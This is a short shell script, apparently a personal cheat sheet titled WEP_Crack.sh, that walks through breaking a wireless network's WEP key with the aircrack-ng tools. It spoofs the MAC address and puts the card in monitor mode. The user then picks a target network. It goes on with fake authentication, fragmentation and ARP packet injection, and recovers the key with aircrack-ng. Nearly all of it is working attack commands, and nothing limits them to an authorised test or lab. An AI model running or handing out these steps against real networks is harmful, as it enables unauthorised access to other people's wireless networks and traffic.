#								#WEP_Crack.sh
# Created by Matthew Sage
# Last modified: 01/10/09


#wlan0 or eth0

airmon-ng
airmon-ng stop wlan0
ifconfig wlan0 down
macchanger --mac 00:11:22:33:44:55 wlan0
airmon-ng start wlan0
airodump-ng wlan0


#Pick your target, copy it's BSSID, and channel number. Press ctrl + C to end airodump.

airodump-ng -c [channel number] -w [file name e.g WEP_key] --BSSID [BSSID] wlan0

#open new Terminal

aireplay-ng -1 0 -a [BSSID] -h 00:11:22:33:44:55 wlan0
aireplay-ng -5 -b [bssid] -h 00:11:22:33:44:55 wlan0

#maximise first terminal wait for 10,000 packets

#open 3rd teminal

aircrack-ng -b [BSSID] [filename-01.cap]

#Key found! (Remove colons)


_#Inject Packets_

#packetforge-ng -0 -a [paste AP] - h 00:11:22:33:44:55 -k 255.255.255.255 -l 255.255.255.255 -y ( the .xor filename, starts with fragment..) -w ARP

#aireplay-ng -2 -r ARP wlan0

##Press Y.

##Will start injecting, data packets will rise like crazy. When enough data is obtained..

#aircrack-ng wep-01.cap
